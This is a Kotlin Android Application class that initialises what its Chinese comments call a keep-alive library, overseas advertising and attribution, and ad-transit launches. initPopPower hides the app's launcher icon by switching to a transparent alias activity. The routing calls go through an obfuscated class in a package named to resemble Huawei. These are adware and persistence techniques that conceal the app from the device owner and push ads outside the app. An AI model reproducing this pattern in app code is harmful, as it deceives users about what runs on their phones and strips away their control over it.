package com.deploy

import android.app.Application
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat.startActivity
import com.b.w.BaseJksApplication
import com.deploy.tools.ToolUiInstaller
import com.huawei.recharge.featurexzy21.df
import com.kwad.sdk.api.proxy.app.Helpers
import com.p.b.base.APPContext
import com.p.b.base.BaseApplication
import com.p.b.base.OverseaAppHost
import com.p.b.base.OverseaAppInitializer


class TheApplication : BaseJksApplication(), OverseaAppHost {

    companion object {
        @JvmStatic
        var insApp: TheApplication? = null
    }

    override fun onCreate() {
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        AdjustTokens.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        df.page(insApp, intent)
    }


    override fun initPopPower() {
        // 启动图标隐藏：禁用 SplashActivity 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, MysteryActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
        df.vir(insApp)
    }


    override fun initKeepPower(app: Application) {
        Helpers.setGuiyin(true)
    }

}
